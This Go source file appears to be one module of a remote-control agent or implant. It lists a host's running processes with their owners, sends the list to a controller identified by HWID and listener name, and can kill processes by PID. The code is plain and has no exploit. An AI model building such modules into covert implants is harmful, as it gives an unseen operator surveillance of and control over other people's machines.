package handle

import (
	"fmt"
	"main/MessagePack"
	"main/PcInfo"
	"os"
	"os/user"
	"strconv"
	"strings"

	"github.com/shirou/gopsutil/process"
)

func ProcessInfo[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("process")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	//fmt.Println((unmsgpack.ForcePathObject("HWID").GetAsString()))
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("Message").SetAsString(ListAllProcessInfo())
	//fmt.Println(listAllProcessInfo())
	sendFunc(msgpack.Encode2Bytes(), Connection)
}

func KillProcess(pid int) error {
	process, err := os.FindProcess(pid)
	if err != nil {
		return fmt.Errorf("failed to find process: %w", err)
	}
	err = process.Kill()
	if err != nil {
		return fmt.Errorf("failed to kill process: %w", err)
	}
	return nil
}

func ListAllProcessInfo() string {
	processes, err := process.Processes()
	if err != nil {
		//fmt.Printf("Error: %s\n", err)
		return ""
	}

	var allProcessesInfo []string
	for _, p := range processes {
		var infoStrings []string

		name, err := p.Name()
		if err != nil {
			name = "NULL"
		}
		infoStrings = append(infoStrings, fmt.Sprintf("%s-=>", name))
		pid := fmt.Sprintf("%s-=>", strconv.Itoa(int(p.Pid)))
		infoStrings = append(infoStrings, pid)

		ppid, err := p.Ppid()
		if err != nil {
			ppid = 0
		}
		infoStrings = append(infoStrings, fmt.Sprintf("%s-=>", strconv.Itoa(int(ppid))))

		uids, err := p.Uids()
		var username string
		if err != nil || len(uids) == 0 {
			username = "NULL"
		} else {
			u, err := user.LookupId(fmt.Sprint(uids[0]))
			if err != nil {
				username = "NULL"
			} else {
				username = u.Username
			}
		}
		infoStrings = append(infoStrings, fmt.Sprintf("%s", username))

		processInfo := strings.Join(infoStrings, "")
		allProcessesInfo = append(allProcessesInfo, processInfo)
	}

	return strings.Join(allProcessesInfo, "-=>")
}
